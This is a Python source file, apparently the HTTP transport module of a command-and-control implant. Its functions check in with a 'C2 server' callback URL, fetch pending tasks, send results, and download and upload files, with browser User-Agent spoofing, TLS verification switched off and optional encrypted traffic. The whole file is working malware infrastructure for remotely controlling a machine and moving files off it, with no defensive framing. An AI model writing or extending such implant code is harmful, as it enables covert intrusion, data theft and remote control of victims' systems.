"""
HTTP transport for agent communications
"""

import requests
import json
import time
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin

from core.crypto import encrypt_data, decrypt_data
from core.config import Config

class HTTPTransport:
    """HTTP/HTTPS transport implementation"""
    
    def __init__(self, config: Config):
        self.config = config
        self.session = requests.Session()
        self.session.verify = False  # For self-signed certificates
        self.session.headers.update({
            'User-Agent': config.user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def checkin(self, agent_data: Dict[str, Any]) -> Dict[str, Any]:
        """Check in with C2 server"""
        url = urljoin(self.config.callback_url, '/api/v1/checkin')
        
        try:
            # Encrypt data if encryption is enabled
            if self.config.encryption_key:
                payload = encrypt_data(json.dumps(agent_data), self.config.encryption_key)
                response = self.session.post(url, data=payload, timeout=self.config.timeout)
                response_data = decrypt_data(response.content, self.config.encryption_key)
                return json.loads(response_data)
            else:
                response = self.session.post(url, json=agent_data, timeout=self.config.timeout)
                return response.json()
                
        except Exception as e:
            print(f"Checkin error: {e}")
            return {}
    
    def get_tasks(self) -> List[Dict[str, Any]]:
        """Get pending tasks"""
        url = urljoin(self.config.callback_url, '/api/v1/tasks')
        
        try:
            response = self.session.get(url, timeout=self.config.timeout)
            return response.json().get('tasks', [])
        except:
            return []
    
    def send_result(self, result_data: Dict[str, Any]) -> bool:
        """Send task result to server"""
        url = urljoin(self.config.callback_url, '/api/v1/result')
        
        try:
            if self.config.encryption_key:
                payload = encrypt_data(json.dumps(result_data), self.config.encryption_key)
                response = self.session.post(url, data=payload, timeout=self.config.timeout)
            else:
                response = self.session.post(url, json=result_data, timeout=self.config.timeout)
            
            return response.status_code == 200
        except:
            return False
    
    def download_file(self, file_id: str) -> Optional[bytes]:
        """Download file from server"""
        url = urljoin(self.config.callback_url, f'/api/v1/download/{file_id}')
        
        try:
            response = self.session.get(url, timeout=self.config.timeout)
            if response.status_code == 200:
                return response.content
        except:
            pass
        return None
    
    def upload_file(self, file_data: bytes, filename: str) -> bool:
        """Upload file to server"""
        url = urljoin(self.config.callback_url, '/api/v1/upload')
        
        try:
            files = {'file': (filename, file_data)}
            response = self.session.post(url, files=files, timeout=self.config.timeout)
            return response.status_code == 200
        except:
            return False
